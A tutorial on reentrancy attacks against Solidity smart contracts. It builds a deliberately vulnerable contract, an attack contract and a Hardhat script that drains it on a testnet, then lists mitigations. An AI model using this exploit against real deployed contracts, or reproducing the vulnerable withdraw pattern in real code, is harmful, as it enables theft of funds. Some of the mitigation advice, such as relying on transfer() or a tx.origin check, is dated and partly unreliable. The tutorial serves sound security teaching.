# Draining smart contracts with reentrancy
Welcome to the 4th quest in this Polygon series. Now that you are comfortable with Polygon (You basically know how things work, how to connect to the blockchain, how to play around in Hardhat), we can proceed with something new. How about smart contracts security?
First, set up a Hardhat project with all the neccessary stuff (Alchemy key and two private keys). You can revise quest 1 and quest 3 for this. In short, your _module.exports_ in Hardhat configuration should look like this:
```js
module.exports = {
  solidity: {
    version: "0.8.0",
    settings: {
      optimizer: {
        enabled: true,
        runs: 200
      }
    }
  },
  networks: {
    mumbai: {
      url: "",// Alchemy key
      accounts: [
        "",
        ""
      ] // two private keys
    },
  }
  };
```
Alright! In this quest, you will learn how to steal MATICs from a contract’s balance using reentrancy. This kind of hack has been around for a long time, one famous example of it is the DAO hack that resulted in losing 150 million USDs and initiating a hard fork of Ethereum. This gives a strong reason why a smart contract developer should learn this hack, right? So, in this quest, you will write a vulnerable contract and attack it. Then, you will learn how to mitigate reentrancy risks. Hands on the keyboard? Let’s go!

## Writing the Vulnerable contract:
Go into your _contracts_ directory and create a Vulnerable.sol.
So, you wrote a contract that allows users to deposit, withdraw, and transfer funds:
```js
// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;

contract Vulnerable {
    mapping(address => uint256) public balances;

    constructor() payable {}

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawAll() external {
        require(balances[msg.sender] >= 0);
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent);
        balances[msg.sender] = 0;
    }

    function transfer(address payable _to, uint256 amount) public {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        balances[_to] += amount;
    }

    receive() external payable {}

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```
Seems legit, right? Well, there is an extremely dangerous vulnerability here. Let’s investigate what is happening in withdrawAll():
The function checks the caller’s balance. If any, the function sends back that balance. But wait, look at this line:
```js
(bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
```
This calls the _fallback()_ function if _msg.sender_ is a contract. What if _fallback()_ has some malicious code in it? What if _fallback()_ calls withdrawAll() again?
If the latter happened, then _withdrawAll()_ will send funds again because the line “balances[msg.sender] = 0;” did not execute yet. Now the name "reentrancy" makes sense, right? Let’s attack this contract, shall we?

## Writing the Attack contract:
While you are in the _contracts_ directory, create an Attack.sol.
```js
// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;
import "./Vulnerable.sol";

contract Attack {
    Vulnerable public vulnerable;
    
    constructor(Vulnerable _vulnerable) payable {
        vulnerable = Vulnerable(_vulnerable);
    }

    function hack() public payable {
        vulnerable.deposit{value: msg.value}();
        vulnerable.withdrawAll();
    }

    fallback() external payable {
        if (address(vulnerable).balance != 0) {
            vulnerable.withdrawAll();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```
All you have to do is to call _Attack.hack()_ along with some MATICs. This will deposit these MATICs as your balance in the _Vulnerable_ contract. After that, it calls _Vulnerable.withdrawAll()_, which in turn calls _Attack.fallback()_ by sending your balance. Now _fallback()_ reenters _Vulnerable_ with your _Attack_’s address as _msg.sender_ and this goes on. All of this is possible because the line that nullifies your balance did not execute yet.
If you want to try this out on Remix first, do the following:
NOTE: the numbers below are just for demonstration purposes. Consider sending 4 * 10 ^ (-9) and 1 * 10 ^ (-9), for example.

1 - deploy _Vulnerable_.

2 - send 4 MATICS to _Vulnerable_ (let’s imagine that other addresses sent to _Vulnerable_ before).
Now you are the hacker!

3 - deploy _Attack_ with _Vulnerable_'s address.

4 - call _Attack.hack()_ with 1 MATIC.

5 -  check your _Attack_’s balance, you have 5 MATICS and poor Vulnerable has nothing!
Before we jump to Hardhat, let's bore you with some theory!


## Types of reentrancy:
There are two main types of reentrancy attacks: single-function and cross-function. The Attack function above implements single-function reentrancy because the function that calls _fallback()_ is the same function being attacked (i.e. _withdrawAll()_). Let’s take an example of cross-function reentrancy:
It is pretty much the same as we did, except that in _fallback()_ we are going to attack Vulnerable.transfer(). In fallback(), write just this line:
```js
vulnerable.transfer(your_second_address, amount);
```
This will give your second address free credits! Again, this is because the line “balances[msg.sender] = 0” did not execute yet. This is cross-functional reentrancy because the call chain works like that:
_Vulnerable.withdrawAll()_ -> _Attack.fallback()_ -> _Vulnerable.transfer()_
So the function being attacked is not the one that called _fallback()_.  
 Isn’t this cool? But now to Hardhat, let's simulate the attack.

## Attacking in Hardhat:
 create a _scripts_ directory, create a js file, name it Attack.js.
 This piece of code will be  a little bit long because it has some extra _console.log_ statements to explain milestones.
 
```js
 
const { ethers } = require('hardhat')

const sleep = (milliseconds) => {
    return new Promise(resolve => setTimeout(resolve, milliseconds))
}

hack = async () => {
let Vulnerable, vulnerable, Attack, attack, signers, victim, hacker, overrides, victimBalance, hackerBalance

signers = await ethers.getSigners()
victim = signers[0]
hacker = signers[1]

console.log("I am the victim and I am deploying my vulnerable contract:")
Vulnerable = await ethers.getContractFactory("Vulnerable")
overrides = {
    value: ethers.utils.parseEther("0.000000004"),
}
vulnerable = await Vulnerable.deploy(overrides)
console.log("The vulnerable contract was deployed to " + vulnerable.address)
console.log("-----------------------------------------------")

console.log("I am the hacker and I am deploying my attack contract:")
Attack = await ethers.getContractFactory("Attack")
attack = await Attack.connect(hacker).deploy(vulnerable.address)
console.log("The attack contract was deployed to " + attack.address)
console.log("-----------------------------------------------")

victimBalance = await vulnerable.getBalance()
hackerBalance = await attack.getBalance()
console.log("The victim has " + victimBalance + " MATICs")
console.log("The hacker has " + hackerBalance + " MATICs")
console.log("-----------------------------------------------")

console.log("The hacker is about to hack()")
overrides = {
    value: ethers.utils.parseEther("0.000000001"),
    from: hacker.address
}
await attack.connect(hacker).hack(overrides)
console.log("-----------------------------------------------")

console.log("The hack is over:")
await sleep(20000)
victimBalance = await vulnerable.getBalance()
hackerBalance = await attack.getBalance()
console.log("The victim has " + victimBalance + " MATICs")
console.log("The hacker has " + hackerBalance + " MATICs")
}
hack()
```
 
You got used to this syntax, right?
The scripts just simulates what was explained above (the Remix part), Nothing more. 
Now if you run
```
npx hardhat run Attack.js --network mumbai
```
You should get a log of the attack, like this:
```
I am the victim and I am deploying my vulnerable contract:
The vulnerable contract was deployed to 0xb2d82069B9dfcD13cD7a8DfC6a7767822Ef04565
-----------------------------------------------
I am the hacker and I am deploying my attack contract:
The attack contract was deployed to 0x1209463c789eA5f50BB2a945420C51dE3d587931
-----------------------------------------------
The victim has 4000000000 MATICs
The hacker has 0 MATICs
-----------------------------------------------
The hacker is about to hack()
-----------------------------------------------
The hack is over:
The victim has 0 MATICs
The hacker has 5000000000 MATICs
```

So We had our fun with the code. But now to the most important thing, how can we prevent such attacks?

## Preventing reentrancy:
There are three standard methods to protect your contracts from such attacks.

1 - use the Check-Effects-Interaction Pattern:
https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern.
The name of the pattern says it all. Checks first, then state changes, and lastly external calls. In our case, this will involve saving balances[msg.sender] to a uint256, nullifying balances[msg.sender], and then sending that uint256. And Of course, the _call()_ should be at the end. 

2 - avoid _call()_ when you can:
If you can use the built-in _transfer()_ to send ethers, then do it. This only allows 2300 gas to be used, which is not enough to reenter. Meanwhile, _call()_ forwards all the remaining gas, allowing for more complex interaction (more freedom for hackers).

3 - use a mutex:
Introduce a state variable that locks the contract before sending, and unlocks it afterward.
```js
// SPDX-License-Identifier: MIT
 
pragma solidity >=0.7.0 <0.9.0;
 
contract Locked {
   bool mutex = false;
   mapping(address => uint256) public balances;
 
   function deposit() external payable {
       balances[msg.sender] += msg.value;
   }
 
   function withdrawAll() external {
       require(!mutex);
       require(balances[msg.sender] >= 0);
       uint256 amount = balances[msg.sender];
       balances[msg.sender] = 0;
       mutex = true;
       (bool sent, ) = msg.sender.call{value: amount}("");
       require(sent);
       mutex = false;
   }
 
   function transfer(address payable _to, uint256 amount) public {
       require(!mutex);
       require(balances[msg.sender] >= amount);
       balances[msg.sender] -= amount;
       balances[_to] += amount;
   }
 
   receive() external payable {}
 
   function getBalance() public view returns (uint256) {
       return address(this).balance;
   }
}

```

4- Also, if you do not want intermediate contracts to call your contract, just include:
```js require (tx.origin == msg.sender); ```
This can be helpful if you like to allow personal addresses only to call your functions.

## THE END!
That all for this quest, you now know what to do to protect your contract from reentrancy. Happy coding! 


